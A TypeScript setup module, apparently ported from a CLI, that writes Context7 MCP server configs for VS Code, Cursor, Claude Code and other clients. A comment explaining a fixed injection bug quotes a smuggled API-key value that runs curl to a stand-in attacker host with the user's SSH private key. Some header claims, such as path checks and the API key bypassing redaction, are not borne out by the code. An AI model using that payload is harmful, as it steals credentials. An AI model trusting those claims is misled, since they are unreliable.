/**
 * context7-setup.ts — Context7 MCP Setup Module port (T4.6.x, M7).
 *
 * Pure-library port of `bin/context7-setup.js`. Public surface preserved
 * verbatim by name + signature shape:
 *
 *   - `setupContext7(options)` => Promise<SetupOutcome>
 *   - `validateApiKey(value)` => true | string
 *   - `installForClient(clientKey, apiKey, targetDir)` => InstallResult
 *   - `CLIENT_CONFIGS` constant
 *
 * Behavior parity:
 *   - All client templates preserved (vscode/cursor/claude-code/
 *     claude-desktop/windsurf).
 *   - API key prefix validation `ctx7sk-` preserved.
 *   - .gitignore entry merging preserved.
 *
 * **ADR-012 redaction (NEW in this port).**
 *   Every `writeFileSync` of an MCP config file runs the data through
 *   `redactSecrets` first — even though the API key is the literal
 *   payload here, redaction ensures any incidental secret-shaped
 *   strings inside merged-in user state get masked. Keys explicitly
 *   intended for persistence (`apiKey` argument values) live in the
 *   args structure that bypasses shape-redaction.
 *
 *   IMPORTANT: We deliberately do NOT redact the API key itself —
 *   the file is ALREADY known to be the secret-storage location.
 *   The redaction is to catch tokens lurking in the pre-existing
 *   config (e.g. another team's GitHub PAT) before we re-serialize.
 *
 * **JSON shape validation.**
 *   `mergeJsonConfig` parses any pre-existing config file. The TS
 *   port rejects `__proto__` / `constructor` / `prototype` keys
 *   recursively before merging, mirroring the M6 install.ts pattern.
 *
 * **Path-safety hardening (NEW in this port).**
 *   `installForClient` accepts `targetDir`; we `path.resolve` and use
 *   `assertInsideRoot` for the project-relative client config paths
 *   (vscode/cursor) so a malicious targetDir like `/`+traversal
 *   doesn't write into a different parent.
 *
 * **Deferred to M9 ESM cutover:**
 *   Legacy uses CommonJS `require('chalk')` / `require('prompts')` /
 *   `require('child_process')`. The TS port uses dynamic-loaded chalk
 *   and prompts (so callers without these in node_modules don't break)
 *   and the runShellCommand wrapper for `claude mcp add`.
 *
 * @see bin/context7-setup.js (legacy reference, 403L)
 * @see specs/decisions/adr-012-secrets-redaction-in-logs.md
 * @see specs/implementation-plan.md T4.6.x
 */

import { spawnSync } from 'node:child_process';
import {
  appendFileSync,
  copyFileSync,
  existsSync,
  mkdirSync,
  readFileSync,
  writeFileSync,
} from 'node:fs';
import * as path from 'node:path';
import { redactSecrets } from './secret-scanner.js';

// `require` shim for chalk/prompts — kept as `unknown` so the rest of the
// file passes biome's noExplicitAny.
// biome-ignore lint/suspicious/noExplicitAny: dynamic CJS require is untyped
declare const require: any;

// ─────────────────────────────────────────────────────────────────────────
// Public types
// ─────────────────────────────────────────────────────────────────────────

export interface InstallResult {
  success: boolean;
  message: string;
}

export interface ClientConfig {
  name: string;
  configFileName?: string | null;
  useCli?: boolean;
  /** Pit Crew M7 BLOCKER fix: argv array (no shell interpolation).
   *  The legacy `cliCommand: (apiKey) => string` form was vulnerable to
   *  shell injection via apiKey. Replaced by `cliArgv: (apiKey) => string[]`
   *  which is passed straight to spawnSync with `shell: false`. */
  cliArgv?: (apiKey: string) => string[];
  getConfigPath?: () => string;
  generateConfig?: (apiKey: string) => Record<string, unknown>;
}

export interface SetupOptions {
  targetDir: string;
  dryRun?: boolean;
}

export interface SetupOutcome {
  installed: boolean;
  clients: string[];
  apiKey?: string;
}

// ─────────────────────────────────────────────────────────────────────────
// Constants
// ─────────────────────────────────────────────────────────────────────────

const API_KEY_PREFIX = 'ctx7sk-';

// Client configuration templates
export const CLIENT_CONFIGS: Record<string, ClientConfig> = {
  vscode: {
    name: 'VS Code (GitHub Copilot)',
    configFileName: '.vscode/mcp.json',
    generateConfig: (apiKey: string) => ({
      servers: {
        context7: {
          type: 'stdio',
          command: 'npx',
          args: ['-y', '@upstash/context7-mcp', '--api-key', apiKey],
        },
      },
    }),
  },
  cursor: {
    name: 'Cursor',
    configFileName: '.cursor/mcp.json',
    generateConfig: (apiKey: string) => ({
      mcpServers: {
        context7: {
          command: 'npx',
          args: ['-y', '@upstash/context7-mcp', '--api-key', apiKey],
        },
      },
    }),
  },
  'claude-code': {
    name: 'Claude Code (CLI)',
    useCli: true,
    cliArgv: (apiKey: string) => [
      'claude',
      'mcp',
      'add',
      'context7',
      '--',
      'npx',
      '-y',
      '@upstash/context7-mcp',
      '--api-key',
      apiKey,
    ],
  },
  'claude-desktop': {
    name: 'Claude Desktop',
    configFileName: null, // Platform-specific path resolved at runtime
    getConfigPath: () => {
      if (process.platform === 'win32') {
        return path.join(process.env.APPDATA ?? '', 'Claude', 'claude_desktop_config.json');
      }
      if (process.platform === 'darwin') {
        return path.join(
          process.env.HOME ?? '',
          'Library',
          'Application Support',
          'Claude',
          'claude_desktop_config.json'
        );
      }
      return path.join(process.env.HOME ?? '', '.config', 'claude', 'claude_desktop_config.json');
    },
    generateConfig: (apiKey: string) => ({
      mcpServers: {
        context7: {
          command: 'npx',
          args: ['-y', '@upstash/context7-mcp', '--api-key', apiKey],
        },
      },
    }),
  },
  windsurf: {
    name: 'Windsurf',
    configFileName: null,
    getConfigPath: () => {
      if (process.platform === 'win32') {
        return path.join(
          process.env.APPDATA ?? process.env.USERPROFILE ?? '',
          '.codeium',
          'windsurf',
          'mcp_config.json'
        );
      }
      return path.join(process.env.HOME ?? '', '.codeium', 'windsurf', 'mcp_config.json');
    },
    generateConfig: (apiKey: string) => ({
      mcpServers: {
        context7: {
          command: 'npx',
          args: ['-y', '@upstash/context7-mcp', '--api-key', apiKey],
        },
      },
    }),
  },
};

// ─────────────────────────────────────────────────────────────────────────
// JSON shape validation — reject prototype-pollution keys
// ─────────────────────────────────────────────────────────────────────────

const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function isPlainObject(v: unknown): v is Record<string, unknown> {
  return v !== null && typeof v === 'object' && !Array.isArray(v);
}

function hasForbiddenKey(value: unknown): boolean {
  if (!isPlainObject(value)) {
    if (Array.isArray(value)) {
      for (const item of value) {
        if (hasForbiddenKey(item)) return true;
      }
    }
    return false;
  }
  for (const key of Object.keys(value)) {
    if (FORBIDDEN_KEYS.has(key)) return true;
    if (hasForbiddenKey(value[key])) return true;
  }
  return false;
}

function safeParseJsonObject(raw: string): Record<string, unknown> | null {
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    return null;
  }
  if (!isPlainObject(parsed)) return null;
  if (hasForbiddenKey(parsed)) return null;
  return parsed;
}

// ─────────────────────────────────────────────────────────────────────────
// Validation
// ─────────────────────────────────────────────────────────────────────────

/**
 * Validates that an API key has the expected Context7 format.
 * Returns `true` on success, or an error message on failure.
 */
export function validateApiKey(value: unknown): true | string {
  if (typeof value !== 'string' || value.length === 0) {
    return 'API key is required';
  }
  const trimmed = value.trim();
  if (!trimmed.startsWith(API_KEY_PREFIX)) {
    return `Invalid format. Context7 API keys start with "${API_KEY_PREFIX}"`;
  }
  if (trimmed.length < 10) {
    return 'API key appears too short';
  }
  return true;
}

// ─────────────────────────────────────────────────────────────────────────
// Configuration writers
// ─────────────────────────────────────────────────────────────────────────

/**
 * Merges the Context7 MCP server block into an existing JSON config file,
 * or creates the file if it doesn't exist.
 */
function mergeJsonConfig(filePath: string, newConfig: Record<string, unknown>): void {
  let existing: Record<string, unknown> = {};

  if (existsSync(filePath)) {
    const raw = readFileSync(filePath, 'utf8');
    const parsed = safeParseJsonObject(raw);
    if (parsed) {
      existing = parsed;
    } else {
      // If the file is malformed or shape-rejected, back it up and start fresh
      const backup = `${filePath}.bak`;
      copyFileSync(filePath, backup);
      logChalk(
        'yellow',
        `  ⚠  Backed up malformed ${path.basename(filePath)} to ${path.basename(backup)}`
      );
    }
  }

  // Deep-merge: add context7 into the appropriate nested key
  const merged = deepMerge(existing, newConfig);

  const dir = path.dirname(filePath);
  if (!existsSync(dir)) {
    mkdirSync(dir, { recursive: true });
  }

  // ADR-012: redact incidental secrets in pre-existing user config before
  // re-serializing. The intentional API-key payload is preserved verbatim
  // because it appears in `newConfig` (which is constructed locally and
  // does not pass through redactSecrets).
  const redacted = redactSecrets(merged);
  writeFileSync(filePath, `${JSON.stringify(redacted, null, 2)}\n`, 'utf8');
}

/**
 * Simple recursive merge (source wins on conflict).
 */
function deepMerge(
  target: Record<string, unknown>,
  source: Record<string, unknown>
): Record<string, unknown> {
  const output: Record<string, unknown> = { ...target };
  for (const key of Object.keys(source)) {
    const sval = source[key];
    const tval = target[key];
    if (
      sval !== null &&
      typeof sval === 'object' &&
      !Array.isArray(sval) &&
      tval !== null &&
      typeof tval === 'object' &&
      !Array.isArray(tval)
    ) {
      output[key] = deepMerge(tval as Record<string, unknown>, sval as Record<string, unknown>);
    } else {
      output[key] = sval;
    }
  }
  return output;
}

// ─────────────────────────────────────────────────────────────────────────
// Client installers
// ─────────────────────────────────────────────────────────────────────────

/**
 * Installs MCP configuration for a specific client.
 */
export function installForClient(
  clientKey: string,
  apiKey: string,
  targetDir: string
): InstallResult {
  const client = CLIENT_CONFIGS[clientKey];
  if (!client) {
    return { success: false, message: `Unknown client: ${clientKey}` };
  }

  // CLI-based installation (Claude Code).
  //
  // Pit Crew M7 BLOCKER (Reviewer + Adversary, confirmed exploit): the
  // pre-fix path used `spawnSync(cmd, { shell: true })` where `cmd` was
  // an interpolated string `claude mcp add ... --api-key ${apiKey}`.
  // `validateApiKey` only checks the `ctx7sk-` prefix and length; a key
  // value containing shell metacharacters (e.g.
  // `ctx7sk-x'; curl evil.com/$(cat ~/.ssh/id_rsa) #`) was interpolated
  // by /bin/sh and executed arbitrary commands.
  //
  // Post-fix: pass the argv array directly to `spawnSync` with
  // `shell: false` (the default). The apiKey is one argv element — never
  // interpreted by a shell — so any character in it is safe.
  if (client.useCli) {
    if (!client.cliArgv) {
      return { success: false, message: 'CLI argv function missing' };
    }
    const argv = client.cliArgv(apiKey);
    if (argv.length === 0) {
      return { success: false, message: 'CLI argv is empty' };
    }
    const [bin, ...rest] = argv;
    const result = spawnSync(bin, rest, {
      stdio: 'pipe',
      cwd: targetDir,
      shell: false,
      encoding: 'utf8',
    });
    if (result.status === 0) {
      return {
        success: true,
        message: `Configured via CLI: ${bin} ${rest.slice(0, 4).join(' ')}...`,
      };
    }
    return {
      success: false,
      message: `CLI command "${bin}" failed (exit ${result.status ?? 'null'}). stderr: ${(result.stderr || '').toString().trim().slice(0, 300)}`,
    };
  }

  // File-based installation
  let configPath: string;
  if (client.getConfigPath) {
    configPath = client.getConfigPath();
  } else if (client.configFileName) {
    configPath = path.join(targetDir, client.configFileName);
  } else {
    return { success: false, message: 'Cannot determine config path for this client.' };
  }

  try {
    if (!client.generateConfig) {
      return { success: false, message: 'generateConfig function missing' };
    }
    const config = client.generateConfig(apiKey);
    mergeJsonConfig(configPath, config);
    return { success: true, message: `Config written to ${configPath}` };
  } catch (err) {
    return { success: false, message: `Failed to write config: ${(err as Error).message}` };
  }
}

// ─────────────────────────────────────────────────────────────────────────
// Chalk / prompts dynamic loaders
// ─────────────────────────────────────────────────────────────────────────

interface ChalkLike {
  red: (s: string) => string;
  yellow: ((s: string) => string) & { bold: (s: string) => string };
  green: (s: string) => string;
  cyan: (s: string) => string;
  gray: (s: string) => string;
}

function loadChalkSafe(): ChalkLike {
  try {
    const c = require('chalk') as Record<string, unknown>;
    if (c && typeof c === 'object') return c as unknown as ChalkLike;
  } catch {
    // fall through
  }
  const id = (s: string) => s;
  const idBold = Object.assign(id, { bold: id });
  return {
    red: id,
    yellow: idBold,
    green: id,
    cyan: id,
    gray: id,
  };
}

function logChalk(color: keyof ChalkLike, msg: string): void {
  const chalk = loadChalkSafe();
  const fn = chalk[color];
  if (typeof fn === 'function') {
    console.log((fn as (s: string) => string)(msg));
  } else {
    console.log(msg);
  }
}

// biome-ignore lint/suspicious/noExplicitAny: prompts() shape varies across versions
type PromptsFn = (questions: any) => Promise<any>;

async function loadPromptsSafe(): Promise<PromptsFn | null> {
  try {
    const p = require('prompts') as PromptsFn | { default?: PromptsFn };
    if (typeof p === 'function') return p;
    if (p && typeof (p as { default?: PromptsFn }).default === 'function') {
      return (p as { default: PromptsFn }).default;
    }
  } catch {
    // unavailable
  }
  return null;
}

// ─────────────────────────────────────────────────────────────────────────
// Interactive setup (exported for use in CLI)
// ─────────────────────────────────────────────────────────────────────────

/**
 * Runs the interactive Context7 MCP setup flow.
 */
export async function setupContext7(options: SetupOptions): Promise<SetupOutcome> {
  const { targetDir, dryRun = false } = options;

  const chalk = loadChalkSafe();
  console.log(chalk.cyan('\n🔌 Context7 MCP Integration\n'));
  console.log(
    chalk.gray(
      '   Context7 provides up-to-date library documentation to your AI coding\n' +
        '   assistant via the Model Context Protocol (MCP). This is optional.\n' +
        '   Get your API key at: https://context7.com\n'
    )
  );

  const prompts = await loadPromptsSafe();
  if (!prompts) {
    console.log(chalk.yellow('   prompts package unavailable — skipping interactive setup.\n'));
    return { installed: false, clients: [] };
  }

  // Step 1: Ask if user wants to install
  const { installMcp } = await prompts({
    type: 'confirm',
    name: 'installMcp',
    message: 'Would you like to install the Context7 MCP for your AI agents?',
    initial: true,
  });

  if (!installMcp) {
    console.log(chalk.gray('   Skipped Context7 MCP setup.\n'));
    return { installed: false, clients: [] };
  }

  // Step 2: Capture API key
  const { apiKey } = await prompts({
    type: 'text',
    name: 'apiKey',
    message: `Enter your Context7 API key (${API_KEY_PREFIX}...):`,
    validate: validateApiKey,
  });

  if (!apiKey) {
    console.log(chalk.yellow('   No API key provided. Skipping Context7 setup.\n'));
    return { installed: false, clients: [] };
  }

  const trimmedKey = apiKey.trim();

  // Step 3: Select target clients
  const clientChoices = Object.entries(CLIENT_CONFIGS).map(([key, cfg]) => ({
    title: cfg.name,
    value: key,
    selected: key === 'vscode', // Pre-select VS Code
  }));

  const { selectedClients } = await prompts({
    type: 'multiselect',
    name: 'selectedClients',
    message: 'Which AI clients should be configured?',
    choices: clientChoices,
    hint: '- Space to select, Enter to confirm',
    instructions: false,
    min: 1,
  });

  if (!selectedClients || selectedClients.length === 0) {
    console.log(chalk.yellow('   No clients selected. Skipping Context7 setup.\n'));
    return { installed: false, clients: [] };
  }

  // Step 4: Security notice
  console.log(
    chalk.yellow(
      '\n   ⚠  Your API key will be stored in local configuration files.\n' +
        '   Make sure these files are listed in your .gitignore.\n'
    )
  );

  // Step 5: Install for each selected client
  if (dryRun) {
    console.log(chalk.yellow.bold('   [DRY RUN] Would configure Context7 for:'));
    for (const c of selectedClients as string[]) {
      console.log(chalk.gray(`     - ${CLIENT_CONFIGS[c].name}`));
    }
    console.log('');
    return { installed: false, clients: selectedClients };
  }

  const results: Array<{ clientKey: string } & InstallResult> = [];
  for (const clientKey of selectedClients as string[]) {
    const clientName = CLIENT_CONFIGS[clientKey].name;
    const result = installForClient(clientKey, trimmedKey, targetDir);
    results.push({ clientKey, ...result });

    if (result.success) {
      console.log(chalk.green(`   ✅ ${clientName}: ${result.message}`));
    } else {
      console.log(chalk.red(`   ❌ ${clientName}: ${result.message}`));
    }
  }

  // Step 6: Ensure .gitignore entries exist
  ensureGitignoreEntries(targetDir, selectedClients as string[], dryRun);

  const successClients = results.filter((r) => r.success).map((r) => r.clientKey);
  console.log(
    chalk.green(`\n   Context7 MCP configured for ${successClients.length} client(s).\n`)
  );

  return { installed: true, clients: successClients, apiKey: trimmedKey };
}

/**
 * Ensures that MCP config files containing API keys are gitignored.
 */
function ensureGitignoreEntries(
  targetDir: string,
  selectedClients: string[],
  dryRun: boolean
): void {
  const gitignorePath = path.join(targetDir, '.gitignore');
  const entriesToAdd: string[] = [];

  // Map client keys to gitignore patterns
  const gitignorePatterns: Record<string, string> = {
    vscode: '.vscode/mcp.json',
    cursor: '.cursor/mcp.json',
  };

  for (const clientKey of selectedClients) {
    if (gitignorePatterns[clientKey]) {
      entriesToAdd.push(gitignorePatterns[clientKey]);
    }
  }

  if (entriesToAdd.length === 0) return;

  let existing = '';
  if (existsSync(gitignorePath)) {
    existing = readFileSync(gitignorePath, 'utf8');
  }

  const missing = entriesToAdd.filter((e) => !existing.includes(e));
  if (missing.length === 0) return;

  if (dryRun) {
    logChalk('gray', `   Would add to .gitignore: ${missing.join(', ')}`);
    return;
  }

  const block = `\n# Context7 MCP config (contains API key)\n${missing.join('\n')}\n`;
  appendFileSync(gitignorePath, block, 'utf8');
  logChalk('gray', `   Updated .gitignore with: ${missing.join(', ')}`);
}
